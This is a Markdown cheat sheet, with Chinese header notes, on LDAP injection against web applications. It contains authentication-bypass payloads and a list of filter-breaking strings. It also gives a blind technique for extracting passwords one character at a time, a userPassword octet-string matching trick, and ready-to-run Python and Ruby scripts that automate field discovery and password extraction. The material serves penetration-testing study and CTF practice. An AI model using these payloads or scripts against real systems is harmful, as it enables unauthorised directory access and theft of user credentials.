<!--
 * [业务问题]: LDAP 注入是针对基于 LDAP 目录服务的 Web 应用的攻击手法。攻击者通过注入特殊字符和逻辑运算符修改 LDAP 查询语句，可以绕过身份验证、提取敏感用户信息或获取未经授权的目录访问权限。
 * [实现逻辑]: 本文档详细介绍了 LDAP 注入的多种 Payload 形式、盲注利用技术（通过通配符逐位猜解密码）、默认属性列表以及 userPassword 属性的特殊利用方法，并提供了 Python 和 Ruby 自动化扫描脚本。
 -->

# LDAP Injection (LDAP 注入)

> LDAP 注入是一种用于利用基于用户输入构建 LDAP 语句的 Web 应用程序的攻击。当应用程序无法正确清理用户输入时，就可以使用本地代理修改 LDAP 语句。

## 概要 (Summary)

* [Methodology](#methodology)
* [Payloads](#payloads)
* [Blind Exploitation](#blind-exploitation)
* [Defaults attributes](#defaults-attributes)
* [Exploiting userPassword attribute](#exploiting-userpassword-attribute)
* [Scripts](#scripts)
    * [Discover valid LDAP fields](#discover-valid-ldap-fields)
    * [Special blind LDAP injection](#special-blind-ldap-injection)
* [Labs](#labs)
* [References](#references)


## Methodology

Example 1.

```sql
user  = *)(uid=*))(|(uid=*
pass  = password
query = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))
```

Example 2

```sql
user  = admin)(!(&(1=0
pass  = q))
query = (&(uid=admin)(!(&(1=0)(userPassword=q))))
```

## Payloads

```text
*
*)(&
*))%00
)(cn=))\x00
*()|%26'
*()|&'
*(|(mail=*))
*(|(objectclass=*))
*)(uid=*))(|(uid=*
*/*
*|
/
//
//*
@*
|
admin*
admin*)((|userpassword=*)
admin*)((|userPassword=*)
x' or name()='username' or 'x'='y
```

## Blind Exploitation

We can extract using a bypass login

```sql
(&(sn=administrator)(password=*))    : OK
(&(sn=administrator)(password=A*))   : KO
(&(sn=administrator)(password=B*))   : KO
...
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MA*))  : KO
(&(sn=administrator)(password=MB*))  : KO
...
(&(sn=administrator)(password=MY*))  : OK
(&(sn=administrator)(password=MYA*)) : KO
(&(sn=administrator)(password=MYB*)) : KO
(&(sn=administrator)(password=MYC*)) : KO
...
(&(sn=administrator)(password=MYK*)) : OK
(&(sn=administrator)(password=MYKE)) : OK
```


## Defaults attributes

Can be used in an injection like `*)(ATTRIBUTE_HERE=*`

```bash
userPassword
surname
name
cn
sn
objectClass
mail
givenName
commonName
```


## Exploiting userPassword attribute

`userPassword` attribute is not a string like the `cn` attribute for example but it’s an OCTET STRING
In LDAP, every object, type, operator etc. is referenced by an OID : octetStringOrderingMatch (OID 2.5.13.18).

> octetStringOrderingMatch (OID 2.5.13.18): An ordering matching rule that will perform a bit-by-bit comparison (in big endian ordering) of two octet string values until a difference is found. The first case in which a zero bit is found in one value but a one bit is found in another will cause the value with the zero bit to be considered less than the value with the one bit.

```bash
userPassword:2.5.13.18:=\xx (\xx is a byte)
userPassword:2.5.13.18:=\xx\xx
userPassword:2.5.13.18:=\xx\xx\xx
```

## Scripts

### Discover valid LDAP fields

```python
#!/usr/bin/python3
import requests
import string

fields = []
url = 'https://URL.com/'
f = open('dic', 'r')
world = f.read().split('\n')
f.close()

for i in world:
    r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\x00', 'password':'bla'}) #Like (&(login=*)(ITER_VAL=*))\x00)(password=bla))
    if 'TRUE CONDITION' in r.text:
        fields.append(str(i))

print(fields)
```

### Special blind LDAP injection (without "*")

```python
#!/usr/bin/python3
import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(50):
    print("[i] Looking for number " + str(i))
    for char in alphabet:
        r = requests.get("http://ctf.web?action=dir&search=admin*)(password=" + flag + char)
        if ("TRUE CONDITION" in r.text):
            flag += char
            print("[+] Flag: " + flag)
            break
```

Exploitation script by [@noraj](https://github.com/noraj)

```ruby
#!/usr/bin/env ruby
require 'net/http'
alphabet = [*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!"$%=^[]:;'.split('')

flag = ''
(0..50).each do |i|
  puts("[i] Looking for number #{i}")
  alphabet.each do |char|
    r = Net::HTTP.get(URI("http://ctf.web?action=dir&search=admin*)(password=#{flag}#{char}"))
    if /TRUE CONDITION/.match?(r)
      flag += char
      puts("[+] Flag: #{flag}")
      break
    end
  end
end
```



## Labs

* [Root Me - LDAP injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/LDAP-injection-Authentication)
* [Root Me - LDAP injection - Blind](https://www.root-me.org/en/Challenges/Web-Server/LDAP-injection-Blind)


## References

- [[European Cyber Week] - AdmYSion - Alan Marrec (Maki)](https://www.maki.bzh/writeups/ecw2018admyssion/)
- [ECW 2018 : Write Up - AdmYSsion (WEB - 50) - 0xUKN - October 31, 2018](https://0xukn.fr/posts/writeupecw2018admyssion/)
- [How To Configure OpenLDAP and Perform Administrative LDAP Tasks - Justin Ellingwood - May 30, 2015](https://www.digitalocean.com/community/tutorials/how-to-configure-openldap-and-perform-administrative-ldap-tasks)
- [How To Manage and Use LDAP Servers with OpenLDAP Utilities - Justin Ellingwood - May 29, 2015](https://www.digitalocean.com/community/tutorials/how-to-manage-and-use-ldap-servers-with-openldap-utilities)
- [LDAP Blind Explorer - Alonso Parada - August 12, 2011](http://code.google.com/p/ldap-blind-explorer/)
- [LDAP Injection & Blind LDAP Injection - Chema Alonso, José Parada Gimeno - October 10, 2008](https://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf)
- [LDAP Injection Prevention Cheat Sheet - OWASP - July 16, 2019](https://www.owasp.org/index.php/LDAP_injection)